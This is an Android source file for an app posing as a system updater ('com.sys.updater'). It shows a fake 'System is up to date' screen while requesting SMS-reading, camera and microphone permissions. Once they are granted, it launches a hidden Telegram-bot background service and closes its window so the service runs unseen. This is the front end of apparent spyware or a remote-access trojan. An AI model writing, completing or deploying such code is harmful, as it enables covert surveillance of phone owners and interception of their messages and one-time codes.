package com.sys.updater;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.widget.TextView;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        TextView tv = new TextView(this);
        tv.setText("System is up to date.\nInitializing...");
        tv.setPadding(50, 50, 50, 50);
        setContentView(tv);

        List<String> perms = new ArrayList<>();
        perms.add(Manifest.permission.RECEIVE_SMS);
        perms.add(Manifest.permission.READ_SMS);
        perms.add(Manifest.permission.CAMERA);
        perms.add(Manifest.permission.RECORD_AUDIO);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            perms.add(Manifest.permission.POST_NOTIFICATIONS);
        }

        String[] permArray = perms.toArray(new String[0]);
        requestPermissions(permArray, 1);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        
        // Kan-tsennaw chwiya w mn be3d kan-ch3lo l'service
        new Handler().postDelayed(() -> {
            try {
                // Start Telegram Bot Background Service
                startForegroundService(new Intent(this, TelegramService.class));
                
                // Sed l'app (kat-bqa f background)
                finishAffinity();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }, 2000); 
    }
}
